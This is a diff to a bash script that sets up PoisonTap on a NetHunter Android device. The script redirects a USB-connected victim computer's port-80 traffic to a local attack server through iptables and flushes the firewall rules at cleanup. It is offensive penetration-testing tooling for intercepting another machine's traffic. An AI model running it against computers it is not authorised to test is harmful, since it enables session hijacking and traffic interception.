@@ -1,7 +1,14 @@
 #!/bin/bash
 #
-# modified script form mubix-lock
+# Script by @binkybear
+# Modified script form mubix-lock script for RNDIS capture
+# For use on Nethunter on Android devices
 #
+# TODO: 
+# https://github.com/samyk/poisontap/issues/49
+# WEBOSOCKET ISSUE?
+
+
 RNDIS="rndis0" # Older devices use usb0!
 POISON_TAP="/opt/poisontap" # Location of poisontap folder
 
@@ -133,7 +140,15 @@ echo "[+] Wifi must be disabled.  Please disable if you have not yet."
 
 read -p "Press enter to continue..."
 
-iptables -t nat -A PREROUTING -i $RNDIS -p tcp --dport 80 -j REDIRECT --to-port 1337
+# Flush any previous IP Tables
+iptables -F
+iptables -F -t nat
+iptables -F bw_INPUT
+iptables -F bw_OUTPUT
+
+# Setup redireciton
+iptables -A INPUT -p tcp --dport 1337 --jump ACCEPT
+iptables -t nat -A PREROUTING -i $RNDIS -p tcp --destination-port 80 -j REDIRECT --to-port 1337
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
@@ -158,6 +173,12 @@ pkill dhcpd
 pkill responder
 pkill dnsspoof
 pkill nodejs
+
+# Flush IP Tables
+iptables -F
+iptables -F -t nat
+iptables -F bw_INPUT
+iptables -F bw_OUTPUT
 
 # Remove any leases
 rm -f /var/lib/dhcp/dhcpd.leases
